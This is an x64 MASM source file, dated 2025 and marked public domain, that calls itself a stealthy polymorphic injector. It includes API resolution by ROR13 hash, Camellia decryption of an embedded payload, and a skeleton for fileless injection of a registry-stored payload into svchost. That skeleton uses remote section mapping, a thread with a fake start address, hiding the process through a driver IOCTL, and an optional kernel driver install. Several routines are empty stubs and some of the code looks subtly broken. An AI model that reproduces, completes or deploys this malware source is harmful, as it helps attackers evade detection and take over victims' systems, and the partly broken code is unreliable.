; stealthinj.asm  â€”  public domain 2025
; MASM64 polymorphic injector - never touches disk
; ml64 /c stealthinj.asm
; link /subsystem:console /entry:Start stealthinj.obj libcrypto64.lib

OPTION DOTNAME
OPTION PROLOGUE:NONE
OPTION EPILOGUE:NONE

include stealth_poly.h          ; generated by pre-build step

; ----------  OpenSSL  ----------
EXTERN  EVP_camellia_256_ctr : QWORD
EXTERN  EVP_CIPHER_CTX_new  : PROC
EXTERN  EVP_DecryptInit_ex  : PROC
EXTERN  EVP_DecryptUpdate   : PROC
EXTERN  EVP_DecryptFinal_ex : PROC
EXTERN  EVP_CIPHER_CTX_free : PROC

; ----------  Windows  ----------
EXTERN  GetModuleHandleA    : PROC
EXTERN  GetProcAddress      : PROC
EXTERN  ExitProcess         : PROC

; helper macro: get API by hash ---------------------------------
GetApi MACRO modbase:REQ, hash:REQ
    mov  rcx, modbase
    mov  edx, hash
    call GetAPIByHash
ENDM

.code
; ---------------------------------------------------------------
; 64-bit ROR13 hash (classic)
; rdi = ascii string (0-term),  out: eax
; ---------------------------------------------------------------
HashString PROC
    xor  eax, eax
    xor  edx, edx
@@: lodsb
    test al, al
    jz   @F
    ror  edx, 13
    add  edx, eax
    jmp  @B
@@: mov  eax, edx
    ret
HashString ENDP

; ---------------------------------------------------------------
; rcx = dll base,  rdx = hash  ->  rax -> api va
; ---------------------------------------------------------------
GetAPIByHash PROC
    push rbx rsi rdi r12 r13
    mov  rbx, rcx
    mov  eax, [rbx+3Ch]        ; e_lfanew
    mov  rsi, rbx
    add  rsi, rax
    mov  esi, [rsi+88h]        ; ExportDir RVA
    add  rsi, rbx
    mov  ecx, [rsi+18h]        ; NumberOfNames
    mov  r8d, [rsi+20h]        ; AddressOfNames
    add  r8, rbx
FindLoop:
    dec  ecx
    mov  edi, [r8+rcx*4]
    add  rdi, rbx
    push rcx
    call HashString
    pop  rcx
    cmp  eax, edx
    jne  FindLoop
    mov  r8d, [rsi+24h]        ; AddressOfNameOrdinals
    add  r8, rbx
    mov  cx,  [r8+rcx*2]       ; ordinal
    mov  r8d, [rsi+1Ch]        ; AddressOfFunctions
    add  r8, rbx
    mov  eax, [r8+rcx*4]       ; function RVA
    add  rax, rbx
    pop  r13 r12 rdi rsi rbx
    ret
GetAPIByHash ENDP

; ---------------------------------------------------------------
; Camellia-256-CTR decrypt
; rcx = dst, rdx = src, r8 = bytes, r9 = key, [rsp+40] = iv
; ---------------------------------------------------------------
CamelliaDecrypt PROC
    push rbx rsi rdi r12 r13 r14 r15
    sub  rsp, 88h
    mov  r10, rcx              ; dst
    mov  r11, rdx              ; src
    mov  r12, r8               ; bytes
    mov  r13, r9               ; key
    mov  r14, [rsp+0A8h]       ; iv

    ; ctx = EVP_CIPHER_CTX_new()
    call EVP_CIPHER_CTX_new
    mov  rdi, rax              ; ctx

    ; EVP_DecryptInit_ex(ctx, EVP_camellia_256_ctr(), NULL, key, iv)
    mov  rcx, rdi
    mov  rdx, EVP_camellia_256_ctr
    xor  r8, r8
    mov  r9, r13
    push r14                   ; 5th arg = iv
    push 1                     ; enc=1 (CTR mode same op)
    call EVP_DecryptInit_ex
    add  rsp, 16

    ; EVP_DecryptUpdate(ctx, dst, &outl, src, bytes)
    mov  rcx, rdi
    mov  rdx, r10
    lea  r8,  [rsp+20h]        ; &outl
    mov  r9, r11
    push r12                   ; bytes
    call EVP_DecryptUpdate
    add  rsp, 8

    ; EVP_DecryptFinal_ex(ctx, dst+outl, &outl2)
    lea  r8, [rsp+24h]
    call EVP_DecryptFinal_ex
    add  rsp, 88h
    call EVP_CIPHER_CTX_free
    pop  r15 r14 r13 r12 rdi rsi rbx
    ret
CamelliaDecrypt ENDP

; ---------------------------------------------------------------
; Registry-based injection (no file on disk)
; ---------------------------------------------------------------
RegistryInject PROC
    ; Get encrypted payload from registry
    call GetRegistryPayload
    
    ; Find target svchost process
    call FindTargetProcess
    
    ; Create section and map into target
    call CreateRemoteSection
    
    ; Decrypt payload into remote section
    call DecryptToRemoteSection
    
    ; Create remote thread with fake start address
    call CreateRemoteThread
    
    ; Hide the new process via driver IOCTL
    call HideProcess
    
    ret
RegistryInject ENDP

; ---------------------------------------------------------------
; Helper functions
; ---------------------------------------------------------------
GetRegistryPayload PROC
    ; Implementation for registry payload retrieval
    ret
GetRegistryPayload ENDP

FindTargetProcess PROC
    ; Implementation for finding target svchost
    ret
FindTargetProcess ENDP

CreateRemoteSection PROC
    ; Implementation for NtCreateSection + NtMapViewOfSection
    ret
CreateRemoteSection ENDP

DecryptToRemoteSection PROC
    ; Implementation for decrypting to remote section
    ret
DecryptToRemoteSection ENDP

CreateRemoteThread PROC
    ; Implementation for RtlCreateUserThread with fake start
    ret
CreateRemoteThread ENDP

HideProcess PROC
    ; Implementation for driver IOCTL to hide process
    ret
HideProcess ENDP

; ---------------------------------------------------------------
; ----------------  ENTRY  --------------------------------------
; ---------------------------------------------------------------
Start PROC
    ; Check if ring-0 is enabled
    IF RING0_ENABLE EQ 1
        ; Install driver first
        call InstallDriver
    ENDIF
    
    ; Perform registry-based injection
    call RegistryInject
    
    ; Exit gracefully
    call ExitProcess
Start ENDP

; ----------------  DATA  ---------------------------------------
CONST   SEGMENT
CAMELLIA_KEY  DB CAMELLIA_KEY
CAMELLIA_IV   DB CAMELLIA_IV
EncryptedPayload DB 00h, 11h, 22h, 33h, 44h, 55h, 66h, 77h, 88h, 99h, 0AAh, 0BBh, 0CCh, 0DDh, 0EEh, 0FFh
PAYLOAD_BYTES EQU $ - EncryptedPayload
PlainPayload  DB PAYLOAD_BYTES DUP (?)
CONST   ENDS

END
